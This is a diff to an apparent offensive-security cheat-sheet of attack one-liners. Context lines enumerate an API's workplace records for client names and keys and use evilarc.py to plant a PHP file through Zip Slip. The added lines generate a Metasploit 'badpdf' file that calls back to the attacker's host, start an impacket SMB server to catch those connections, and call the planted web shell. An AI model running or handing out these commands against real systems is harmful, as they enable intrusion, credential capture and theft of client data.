@@ -466,8 +466,13 @@ cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerU
 cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
 
 [*] File Upload
+-->> Bad PDF
+msfconsole -q -x 'use auxiliary/fileformat/badpdf; set LHOST $MYIP; set FILENAME x.pdf; run'; cp $HOME/.msf4/local/x.pdf /Upload/x.pdf
+impacket-smbserver -smb2support $ /Upload/windows
+
 -->> Zip Slip
 evilarc.py x.php --path 'var/www/html' --depth 6 --os unix --output-file x.zip
+wsh ://$TARGET/x.php
 
 -->> Bypasses
 shell.PhP
